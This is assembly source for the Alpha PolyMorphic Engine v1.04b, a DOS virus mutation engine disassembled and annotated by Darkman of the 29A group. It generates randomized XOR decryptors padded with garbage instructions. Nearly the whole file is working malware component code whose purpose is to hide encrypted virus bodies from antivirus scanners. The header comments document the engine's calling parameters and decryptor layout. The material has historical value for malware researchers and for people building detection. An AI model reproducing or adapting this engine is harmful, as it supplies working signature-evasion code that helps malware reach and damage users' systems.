   ; comment *
   ;               Alpha PolyMorphic Engine v 1.04b [APME]  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                            Disassembly by              ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;                             Darkman/29A                 ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;                                                        ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                        ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;        Calling parameters:
   ;          SS:SP  Pointer to data block
   ;
   ;        Return parameters:
   ;          AX     Length of decryptor + encrypted code
   ;
   ;   Format of data block:
   ;     Offset  Size  Description
   ;        00h   04h  Pointer to decryptor + encrypted code
   ;        04h   04h  Pointer to original code
   ;        08h   02h  Maximum length of decryptor
   ;        0Ah   02h  Delta offset
   ;
   ;   Garbage instructions:
   ;     INT 01h; STI; CLI; STD; CLD; INT 03h; INT 03h; CWD; RCL DX,01h; ADD DX,AX;
   ;     SUB DI,[BP+DI]; ADD BP,BX; MOV BP,00h; ADD BP,SP; PUSH SS POP CX;
   ;     ADD BP,CX
   ;
   ;   Alpha PolyMorphic Engine v 1.04b [APME] decryptor:
   ;     Garbage instruction(s).
   ;     MOV AL,imm8                         (Decryption key)
   ;     Garbage instruction(s).
   ;     MOV BX,imm16                (Length of encrypted code + 01h)
   ;     Garbage instruction(s).
   ;     MOV SI,imm16                  (Offset of encrypted code)
   ;     Garbage instruction(s).
   ;     Garbage instruction(s).
   ;     XOR CS:[BX+SI-01h],AL
   ;     Garbage instruction(s).
   ;     DEC BX
   ;     JNZ imm8       (Offset of garbage generation(s) above decryption opcode)
   ;     Garbage instruction(s).
   ;     JMP $+02h
   ;
   ;   Minimum length of decryptor:                  17 bytes.
   ;   Maximum length of decryptor:                 User defined.
   ;   Length of Alpha PolyMorphic Engine v 1.04b [APME]: 469 bytes.
   ;
   ;   I would like to thank Lookout Man for providing me the binary of this
   ;   polymorphic engine.
   ; *

   apme_begin   equ     $           ; Begining of Alpha PolyMorphic En...

   apme_poly    proc    near        ; Alpha PolyMorphic Engine v 1.04b
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            push    ds es bx cx dx si di

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            call    delta_offse
   delta_offse:
            pop     bx          ; Load BX from stack
            sub     bx,offset delta_offse
   gen_poly:
            lea     ax,[bx+mov_al_i_off]
            mov     [bx+index_ptr],ax   ; Store offset of MOV AL,imm8 (De...)

            les     di,[bp+04h]     ; ES:DI = pointer to decryptor + e...
            cld             ; Clear direction flag
            mov     cx,(table_end-table_begin)/02h
   gen_poly_:
            mov     ax,0000000000000011b
            call    garbag_check
            jc      gen_decrypt     ; Carry? Jump to gen_decrypt

            call    gen_garbage

            jmp     gen_poly_
   gen_decrypt:
            call    gen_decrypt_

            loop    gen_poly_

            mov     ax,[bx+decrypt__off]
            mov     si,[bx+dec_bx_j_off]
            sub     ax,si       ; Subtract offset of DEC BX; JNZ i...
            dec     ax          ; Decrease 8-bit immediate
            cmp     ax,0ff80h       ; 8-bit immediate too large?
            jb      gen_poly        ; Below? Jump to gen_poly
            mov     es:[si],al      ; Store 8-bit immediate

            mov     ax,di       ; AX = offset of encrypted code
            sub     ax,[bp+04h]     ; Subtract offset of decryptor + e...

            mov     si,[bx+mov_si_i_off]

            cmp     ax,[bp+0eh]     ; Decryptor too large?
            ja      gen_poly        ; Above? Jump to gen_poly

            push    ax          ; Save AX at stack
            add     ax,[bp+10h]     ; Add delta offset to offset of en...
            mov     es:[si],ax      ; Store offset of encrypted code

            mov     si,[bx+mov_al_i_off]
            call    get_rnd_num
            mov     es:[si],al      ; Store encryption/decryption key

            mov     cx,[bp+0ch]     ; CX = length of original code
            lds     si,[bp+08h]     ; DS:SI = pointer to original code
            cld             ; Clear direction flag
            xchg    al,ah       ; AH = encryption/decryption key
   encrypt_loop:
            lodsb           ; AL = byte of original code
            xor     al,ah       ; Encrypt a byte of original code
            stosb           ; Store byte of of encrypted code

            loop    encrypt_loop
            pop     ax          ; Load AX from stack
            add     ax,[bp+0ch]     ; Add length of original code to l...

            pop     di si dx cx bx es ds
            pop     bp          ; Load BP from stack

            ret             ; Return
            endp

   garbag_check proc    near        ; Check whether or not garbage sho...
            push    ax cx       ; Save registers at stack

            xchg    ax,cx       ; CX = garbage check
            call    get_rnd_num
            and     ax,cx       ; Don't generate a random garbage ...
            jz      do_garbage      ; Zero? Jump to do_garbage

            clc             ; Clear carry flag

            jmp     dont_garbage
   do_garbage:
            stc             ; Set carry flag
   dont_garbage:
            pop     cx ax       ; Load registers from stack

            ret             ; Return
            endp

   random_num   dd      ?           ; 32-bit random number

   get_rnd_num  proc    near        ; Get 32-bit random number
            push    ds dx       ; Save registers at stack
            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of BIOS data area

            mov     ax,ds:[46ch]    ; AX = low-order word of timer tic...
            add     ax,word ptr cs:[bx+random_num]
            adc     ax,00h      ; Convert to 32-bit

            mov     dx,ds:[46ch]    ; AX = low-order word of timer tic...
            add     dx,word ptr cs:[bx+random_num+02h]
            adc     dx,00h      ; Convert to 32-bit

            mul     dx          ; DX:AX = 32-bit random number
            inc     ax          ; Increase low-order word of 32-bi...

            mov     word ptr cs:[bx+random_num],ax
            mov     word ptr cs:[bx+random_num+02h],dx

            pop     dx ds       ; Load registers from stack

            ret             ; Return
            endp

   gen_garbage  proc    near        ; Generate a random garbage instru...
            push    cx si       ; Save registers at stack
            lea     si,[bx+garbage_tbl] ; SI = offset of garbage_tbl
            call    get_rnd_num
            and     ax,0000000000001111b
            shl     ax,01h      ; Multiply random number with two
            add     si,ax       ; SI = offset within garbage_tbl
            lodsw           ; AX =   "      "    garbage_tbl_

            add     ax,bx       ; Add delta offset to offset withi...
            mov     si,ax       ; SI = offset within garbage_tbl_
            xor     ax,ax       ; Zero AX
            lodsb           ; AL = length of opcode

            mov     cx,ax       ; CX =   "    "    "
            rep     movsb       ; Move opcode to decrypter + encry...
            pop     si cx       ; Load registers from stack

            ret             ; Return
            endp

   gen_decrypt_ proc    near        ; Generate decryptor
            push    cx si       ; Save registers at stack
            push    cx          ; Save CX at stack
            lea     si,[bx+decrypt_tbl] ; SI = offset of decrypt_tbl
            dec     cx          ; Decrease counter
            shl     cx,01h      ; Multiply counter with two
            add     si,cx       ; SI = offset within decrypt_tbl
            lodsw           ; AX =   "      "    decrypt_tbl_

            add     ax,bx       ; Add delta offset to offset withi...
            mov     si,ax       ; SI = offset within decrypt_tbl_
            xor     ax,ax       ; Zero AX
            lodsb           ; AL = length of opcode
            mov     cx,ax       ; CX =   "    "    "

            lodsb           ; AL = length of immediate
            rep     movsb
            pop     cx          ; Load CX from stack

            or      al,al       ; No immediate?
            jz      no_immediate    ; Zero? Jump to no_immediate

            dec     al          ; Decrease length of immediate

            mov     si,[bx+index_ptr]   ; SI = index pointer
            mov     [si],di         ; Store offset within decryptor + ...
            add     si,02h      ; Add two to index pointer
            mov     [bx+index_ptr],si   ; Store index pointer

            add     di,ax       ; Add length of immediate to offse...
   no_immediate:
            pop     si cx       ; Load registers from stack

            ret             ; Return
            endp

            db      0ah,0dh,'[àPME] Alpha PolyMorphic Engine by ViKing - Version 1.04b',0ah,0dh
   garbage_tbl  dw      int_01h         ; Offset of int_01h
            dw      sti_        ; Offset of sti_
            dw      cli_        ; Offset of cli_
            dw      std_        ; Offset of std_
            dw      cld_        ; Offset of cld_
            dw      int_03h         ; Offset of int_03h
            dw      int_03h_        ; Offset of int_03h_
            dw      cwd_        ; Offset of cwd_
            dw      rcl_dx_01h      ; Offset of rcl_dx_01h
            dw      add_dx_ax       ; Offset of add_dx_ax
            dw      sub_di_bp_di    ; Offset of sub_di_bp_di
            dw      add_bp_bx       ; Offset of add_bp_bx
            dw      mov_bp_00h      ; Offset of mov_bp_00h
            dw      add_bp_sp       ; Offset of add_bp_sp
            dw      push_ss_pop_    ; Offset of push_ss_pop_
            dw      add_bp_cx       ; Offset of add_bp_cx
   garbage_tbl_:
   int_01h      db      02h         ; Two bytes opcode
            int     01h         ; Single step
   sti_         db      01h         ; One byte opcode
            sti             ; Set interrupt-enable flag
   cli_         db      01h         ; One byte opcode
            cli             ; Clear interrupt-enable flag
   std_         db      01h         ; One byte opcode
            std             ; Set direction flag
   cld_         db      01h         ; One byte opcode
            cld             ; Clear direction flag
   int_03h      db      01h         ; One byte opcode
            int     03h         ; Breakpoint
   int_03h_     db      02h         ; Two bytes opcode
            dw      0000001111001101b   ; INT 03h (opcode 0cdh,03h)
   cwd_         db      01h         ; One byte opcode
            cwd             ; Convert word to doubleword
   rcl_dx_01h   db      02h         ; Two bytes opcode
            rcl     dx,01h      ; Rotate DX one bit left through c...
   add_dx_ax    db      02h         ; Two bytes opcode
            add     dx,ax       ; Add AX to DX
   sub_di_bp_di db      02h         ; Two bytes opcode
            sub     di,[bp+di]      ; Subtract the immediate at [BP+DI...
   add_bp_bx    db      02h         ; Two bytes opcode
            add     bp,bx       ; Add BX to BP
   mov_bp_00h   db      03h         ; Three bytes opcode
            mov     bp,00h      ; Zero BP
   add_bp_sp    db      02h         ; Two bytes opcode
            add     bp,sp       ; Add SP to BP
   push_ss_pop_ db      02h         ; Two bytes opcode
            push    ss          ; Save SS at stack
            pop     cx          ; Load CX from stack (SS)
   add_bp_cx    db      02h         ; Two bytes opcode
            add     bp,cx       ; Add CX to BP
   table_begin:
   decrypt_tbl  dw      jmp_imm8        ; Offset of jmp_imm8
            dw      dec_bx_jnz_i    ; Offset of dec_bx_jnz_i
            dw      xor_cs__bx_s    ; Offset of xor_cs__bx_
            dw      decrypt_loop    ; Offset of decrypt_loop
            dw      mov_si_imm16    ; Offset of mov_si_imm16
            dw      mov_bx_imm16    ; Offset of mov_bx_imm16
            dw      mov_al_imm8     ; Offset of mov_al_imm8
   table_end:
   decrypt_tbl_:
   mov_al_imm8  db      01h         ; One byte opcode
            db      01h+01h         ; 8-bit immediate + 01h
            mov     al,00h      ; AL = encryption/decryption key
   mov_bx_imm16 db      03h         ; Three bytes opcode
            db      00h         ; No immediate
            mov     bx,(code_end-code_begin+01h)
   mov_si_imm16 db      01h         ; One byte opcode
            db      02h+01h         ; 16-bit immediate + 01h
            mov     si,00h      ; SI = offset of encrypted code
   decrypt_loop db      00h         ; No opcode
            db      00h+01h         ; No immediate + 01h
   xor_cs__bx_s db      04h         ; Four bytes opcode
            db      00h         ; No immediate
            xor     cs:[bx+si-01h],al   ; Decrypt a byte of encrypted code
   dec_bx_jnz_i db      02h         ; Two bytes opcode
            db      01h+01h         ; 8-bit immediate + 01h
            dec     bx          ; Decrease index register
            jnz     $+02h       ; Not zero? Jump to generation abo...
   jmp_imm8     db      02h         ; Two bytes opcode
            db      00h         ; No immediate
            jmp     $+02

   index_ptr    dw      ?           ; Index pointer
   mov_al_i_off dw      ?           ; Offset of MOV AL,imm8 (Decrypti...)
   mov_si_i_off dw      ?           ; Offset of MOV SI,imm16 (Offset ...)
   decrypt__off dw      ?           ; Offset of garbage generation abo...
   dec_bx_j_off dw      ?           ; Offset of DEC BX; JNZ imm8 (Gar...)

   apme_end     equ     $           ; End of Alpha PolyMorphic Engine ...
   apme_length  equ     $-apme_begin    ; Size of Alpha PolyMorphic Engine...
